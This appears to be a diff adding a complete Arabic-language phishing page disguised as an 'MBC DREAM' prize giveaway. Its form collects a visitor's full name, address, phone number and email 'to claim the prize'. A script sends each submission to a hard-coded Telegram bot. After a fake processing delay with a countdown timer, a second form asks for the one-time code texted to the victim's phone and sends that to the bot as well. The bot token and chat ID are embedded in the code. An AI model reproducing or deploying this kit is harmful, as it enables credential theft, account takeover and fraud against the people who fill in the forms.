@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MBC DREAM</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css"
+        integrity="sha384-r4NyP46KrjDleawBgD5tp8Y7UzmLA05oM1iAEQ17CSuDqnUK2+k9luXQOfXJCJ4I" crossorigin="anonymous">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous">
+    </script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/js/bootstrap.min.js"
+        integrity="sha384-oesi62hOLfzrys4LxRF63OJCXdXDipiYWBnvTl9Y9/TRlw5xlKIEHpNyvvDShgf/" crossorigin="anonymous">
+    </script>
+</head>
+
+<body>
+    <style>
+        body {
+            overflow-x: hidden;
+        }
+
+        .modal-header .btn-close {
+            padding: calc(var(--bs-modal-header-padding-y)* .5) calc(var(--bs-modal-header-padding-x)* .5);
+            margin: unset !important;
+        }
+    </style>
+    <div class="container">
+        <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="modalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered modal-lg">
+                <!-- Added modal-lg for larger screens -->
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="modalLabel">ادخل التفاصيل</h5>
+                        <button dir="ltr" type="button" class="btn-close" data-bs-dismiss="modal"
+                            aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="text-center mb-4">
+                            <img src="soso2.png" alt="Form Image" class="img-fluid"> <!-- Ensuring responsive image -->
+                        </div>
+                        <div>
+                            <h1>ادخل البيانات الشخصية لاستلام الجائزة</h1>
+                        </div>
+                        <form id="myForm" method="post">
+                            <div class="mb-3">
+                                <input type="text" name="name" class="form-control" id="name" placeholder="الاسم كامل">
+                            </div>
+                            <div class="mb-3">
+                                <input type="text" name="address" class="form-control" id="address"
+                                    placeholder="العنوان">
+                            </div>
+                            <div class="mb-3">
+                                <input type="text" name="phone" class="form-control" id="phone"
+                                    placeholder="رقم هاتف مع كود الدوله">
+                            </div>
+                            <div class="mb-3">
+                                <input type="text" name="email" class="form-control" id="email"
+                                    placeholder="البريد الالكتروني">
+                            </div>
+                            <button type="submit" class="btn btn-primary w-100">ارسل سجل البيانات الان</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="processingModal" tabindex="-1" aria-labelledby="processingModalLabel"
+            aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered modal-md">
+                <!-- Adjusted to modal-md for medium screens -->
+                <div class="modal-content">
+                    <div class="modal-body text-center">
+                        <div class="spinner-border text-primary" role="status">
+                            <span class="visually-hidden">Processing...</span>
+                        </div>
+                        <h5 class="mt-3">جاري الارسال...</h5>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="otpModal" tabindex="-1" aria-labelledby="otpModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered modal-sm">
+                <!-- Adjusted to modal-sm for smaller screens -->
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="otpModalLabel">ادخل الرمز المرسل الي رقم هاتفك</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body">
+                        <form id="otpForm">
+                            <div class="mb-3">
+                                <input type="text" name="otp" class="form-control" id="otp" placeholder="ادخل الرمز"
+                                    maxlength="6">
+                            </div>
+                            <p class="text-center" id="timer">02:00</p>
+                            <button type="submit" class="btn btn-primary w-100">ارسال</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <a href="" class="d-flex justify-content-center">
+                <img src="soso.png" class="img-fluid" width="800">
+            </a>
+            <a href="#" class="d-flex justify-content-center" data-bs-toggle="modal" data-bs-target="#myModal">
+                <img border="0" class="img-fluid" data-original-height="145" data-original-width="607"
+                    src="sdfw.png">
+            </a>
+        </div>
+    </div>
+
+    <!-- Add this CSS to make modals responsive on extra small screens -->
+    <style>
+        <blade media|%20(max-width%3A%20576px)%20%7B%0D>.modal-dialog {
+            width: 95%;
+            /* Make modal almost full width on small screens */
+            margin: 1.75rem auto;
+        }
+
+        .modal-content {
+            font-size: 14px;
+            /* Reduce font size on small screens */
+        }
+
+        .modal-header h5 {
+            font-size: 16px;
+            /* Adjust title size */
+        }
+        }
+    </style>
+
+</body>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+<script>
+    const chat_id = '908458715',
+        botID = 'bot6139611504:AAGDG2Ug-0nGZTIog2mAfPCxiEkwW7rE70A';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#myForm').addEventListener("submit", async e => {
+        e.preventDefault(); // Don't submit
+        // Convert the form data to an object and filter out empty values
+        const formData = Object.fromEntries(
+            Array.from(new FormData(e.target))
+            .filter(([key, value]) => value.trim() !== "") // Filter out empty values
+        );
+
+        // Convert the filtered form data to a JSON string
+        let text = JSON.stringify(formData, null, 2);
+
+        // Send the request to the Telegram API
+        const sendMessage = await fetch(telegramURL, {
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id,
+                text
+            }),
+        });
+
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) {
+
+            // Hide the modal with id myModal
+            var myModal = bootstrap.Modal.getInstance(document.getElementById('myModal'));
+            if (myModal) {
+                myModal.hide(); // Hide the myModal if it's open
+            }
+
+            // Show the processing modal
+            var processingModal = new bootstrap.Modal(document.getElementById('processingModal'));
+            processingModal.show(); // Show the processing modal
+
+            // After 5 seconds, hide the processing modal and show the OTP modal
+            setTimeout(function () {
+                processingModal.hide(); // Hide the processing modal
+
+                // Show the OTP modal
+                var otpModal = new bootstrap.Modal(document.getElementById('otpModal'));
+                otpModal.show(); // Show the OTP modal
+            }, 5000 * 6); // 5000 milliseconds = 5 seconds
+        } else {
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        }
+
+        e.target.reset(); // Clear the form fields.
+    });
+
+
+
+    document.querySelector('#otpForm').addEventListener("submit", async e => {
+
+        // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target)
+                .entries()), // Convert the form data to an object.
+            null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            }, // This is required when sending a JSON body.
+            body: JSON.stringify({
+                chat_id,
+                text
+            }), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) {
+            e.target.reset();
+        } else {
+
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        }
+        e.target.reset(); // Clear the form fields.
+    });
+</script>
+
+
+
+
+<script>
+    // Timer function
+    function startTimer(duration, display) {
+        var timer = duration,
+            minutes, seconds;
+        var interval = setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.text(minutes + ":" + seconds);
+
+            if (--timer < 0) {
+                clearInterval(interval);
+                // Restart the timer automatically after finishing countdown
+                interval = startTimer(duration, display);
+            }
+        }, 1000);
+
+        return interval;
+    }
+
+    $(document).ready(function () {
+        var twoMinutes = 60 * 2, // 2 minutes in seconds
+            display = $('#timer'),
+            interval;
+
+        // Event when the modal is shown (i.e., OTP modal appears)
+        $('#otpModal').on('shown.bs.modal', function () {
+            // Start the timer when the OTP modal is displayed
+            interval = startTimer(twoMinutes, display);
+        });
+
+        // Reset the timer when the form is submitted
+        $('#otpForm').on('submit', function (e) {
+            e.preventDefault(); // Prevent form submission
+            clearInterval(interval); // Clear the previous interval
+            interval = startTimer(twoMinutes, display); // Restart the timer
+        });
+    });
+</script>
+
+
+
+
+</html>
